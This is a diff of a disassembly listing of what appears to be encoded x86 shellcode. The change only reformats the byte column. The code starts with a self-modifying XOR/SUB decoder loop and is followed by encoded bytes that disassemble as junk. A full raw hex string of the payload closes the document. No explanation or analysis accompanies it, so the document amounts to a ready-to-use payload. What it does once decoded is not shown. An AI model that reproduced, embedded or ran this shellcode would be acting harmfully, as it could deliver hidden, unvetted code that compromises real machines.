@@ -1,51 +1,51 @@
-0x0        push 0x1f                           \x6a\x1f                  j.        
-0x2        pop ebx                             \x5b                      [         
-0x3        xor word ptr [edi + ecx + 1], bx    \x66\x31\x5c\x0f\x01      f1\..     
-0x8        mov ebx, 0xa1                       \xbb\xa1\x00\x00\x00      .....     
-0xd        sub word ptr [edi + ecx + 1], bx    \x66\x29\x5c\x0f\x01      f)\..     
-0x12       inc ecx                             \x41                      A         
-0x13       loop 0                              \xe2\xeb                  ..        
-0x15       int1                                \xf1                      .         
-0x16       push eax                            \x50                      P         
-0x17       jo 7                                \x70\xee                  p.        
 
-0x19       and cl, byte ptr [ebx]              \x22\x0b                  ".        
-0x1b       nop                                 \x90                      .         
-0x1c       or edx, eax                         \x0b\xd0                  ..        
-0x1e       mov cl, byte ptr [ebx]              \x8a\x0b                  ..        
-0x20       rcr byte ptr [edx + 0xb86c00b], 1   \xd0\x9a\x0b\xc0\x86\x0b  ......    
-0x26       xor byte ptr [esi + 0x3c3e900b], bl \x30\x9e\x0b\x90\x3e\x3c  0...><    
-0x2c       mov dh, bl                          \x8a\xf3                  ..        
-0x2e       xor eax, 0x834709b0                 \x35\xb0\x09\x47\x83      5..G.     
-0x33       cli                                 \x36\xfa                  6.        
-0x35       or edx, edi                         \x0b\xd7                  ..        
-0x37       add dword ptr ss:[eax + 0xb], 0x47819e38 \x36\x81\x40\x0b\x38\x9e\x81\x476.@.8..G  
-0x3f       int1                                \xf1                      .         
-0x40       lodsd eax, dword ptr [esi]          \xad                      .         
-0x41       or esi, edx                         \x0b\xf2                  ..        
-0x43       outsd dx, dword ptr [esi]           \x6f                      o         
-0x44       add dword ptr [ebp + eax*8 + 1], 0x3221c4fc \x81\x44\xc5\x01\xfc\xc4\x21\x32.D....!2  
-0x4c       and dword ptr [0x863c01b0], esi     \x21\x35\xb0\x01\x3c\x86  !5..<.    
-0x52       lds esi, ptr [esi]                  \xc5\x36                  .6        
-	 label_0x54:
-0x54       sub dword ptr [edx], esi            \x29\x32                  )2        
-0x56       xor eax, 0xe2380ba9                 \x35\xa9\x0b\x38\xe2      5..8.     
-0x5b       add dword ptr [edi + 0x24], 0xb2fea0b \x81\x47\x24\x0b\xea\x2f\x0b.G$../.   
-0x62       cmp byte ptr [edx + 0x3a0b4781], bl \x38\x9a\x81\x47\x0b\x3a  8..G.:    
-0x68       outsd dx, dword ptr [esi]           \x6f                      o         
-0x69       mov edx, 0xce264781                 \xba\x81\x47\x26\xce      ..G&.     
-0x6e       db 0xe1 (!)                        \xe1                      .         
-0x6f       db 0x9e (!)                        \x9e                      .         
-0x70       and dword ptr [esi], 0xcfc89e36     \x81\x26\x36\x9e\xc8\xcf  .&6...    
-0x76       leave                               \x26\xc9                  &.        
-0x78       and ebp, dword ptr [edi]            \x23\x2f                  #/        
-0x7a       les ecx, ptr [ecx]                  \xc4\x09                  ..        
-0x7c       mov eax, dword ptr [0xf18bc9bc]     \xa1\xbc\xc9\x8b\xf1      .....     
-0x81       jle 0x54                            \x7e\xd1                  ~.        
+0x0 push 0x1f                                6a 1f                  j.
+0x2 pop ebx                                  5b                     [
+0x3 xor word ptr [edi + ecx + 1], bx         66 31 5c 0f 01         f1\..
+0x8 mov ebx, 0xa1                            bb a1 00 00 00         .....
+0xd sub word ptr [edi + ecx + 1], bx         66 29 5c 0f 01         f)\..
+0x12 inc ecx                                  41                     A
+0x13 loop 0                                   e2 eb                  ..
+0x15 int1                                     f1                     .
+0x16 push eax                                 50                     P
+0x17 db 0x70                                  70                     p
+0x18 db 0xee                                  ee                     .
+0x19 and cl, byte ptr [ebx]                   22 0b                  ".
+0x1b nop                                      90                     .
+0x1c or edx, eax                              0b d0                  ..
+0x1e mov cl, byte ptr [ebx]                   8a 0b                  ..
+0x20 rcr byte ptr [edx + 0xb86c00b], 1        d0 9a 0b c0 86 0b      ......
+0x26 xor byte ptr [esi + 0x3c3e900b], bl      30 9e 0b 90 3e 3c      0...><
+0x2c mov dh, bl                               8a f3                  ..
+0x2e xor eax, 0x834709b0                      35 b0 09 47 83         5..G.
+0x33 cli                                      36 fa                  6.
+0x35 or edx, edi                              0b d7                  ..
+0x37 add dword ptr ss:[eax + 0xb], 0x47819e38 36 81 40 0b 38 9e 81 47  6.@.8..G
+0x3f int1                                     f1                     .
+0x40 lodsd eax, dword ptr [esi]               ad                     .
+0x41 or esi, edx                              0b f2                  ..
+0x43 outsd dx, dword ptr [esi]                6f                     o
+0x44 add dword ptr [ebp + eax*8 + 1], 0x3221c4fc 81 44 c5 01 fc c4 21 32  .D....!2
+0x4c and dword ptr [0x863c01b0], esi          21 35 b0 01 3c 86      !5..<.
+0x52 lds esi, ptr [esi]                       c5 36                  .6
+0x54 sub dword ptr [edx], esi                 29 32                  )2
+0x56 xor eax, 0xe2380ba9                      35 a9 0b 38 e2         5..8.
+0x5b add dword ptr [edi + 0x24], 0xb2fea0b    81 47 24 0b ea 2f 0b   .G$../.
+0x62 cmp byte ptr [edx + 0x3a0b4781], bl      38 9a 81 47 0b 3a      8..G.:
+0x68 outsd dx, dword ptr [esi]                6f                     o
+0x69 mov edx, 0xce264781                      ba 81 47 26 ce         ..G&.
+0x6e db 0xe1                                  e1                     .
+0x6f db 0x9e                                  9e                     .
+0x70 and dword ptr [esi], 0xcfc89e36          81 26 36 9e c8 cf      .&6...
+0x76 leave                                    26 c9                  &.
+0x78 and ebp, dword ptr [edi]                 23 2f                  #/
+0x7a les ecx, ptr [ecx]                       c4 09                  ..
+0x7c mov eax, dword ptr [0xf18bc9bc]          a1 bc c9 8b f1         .....
+0x81 jle 0x54                                 7e d1                  ~.
 
-0x83       into                                \xce                      .         
-0x84       db 0xbf                             \xbf                      .         
-0x85       push edi                            \x57                      W         
+0x83 into                                     ce                     .
+0x84 db 0xbf                                  bf                     .
+0x85 push edi                                 57                     W
 
 Raw Hex:
 "6a1f5b66315c0f01bba100000066295c0f0141e2ebf15070ee220b900bd08a0bd09a0bc0860b309e0b903e3c8af335b009478336fa0bd73681400b389e8147f1ad0bf26f8144c501fcc421322135b0013c86c536293235a90b38e28147240bea2f0b389a81470b3a6fba814726cee19e8126369ec8cf26c9232fc409a1bcc98bf17ed1cebf57"
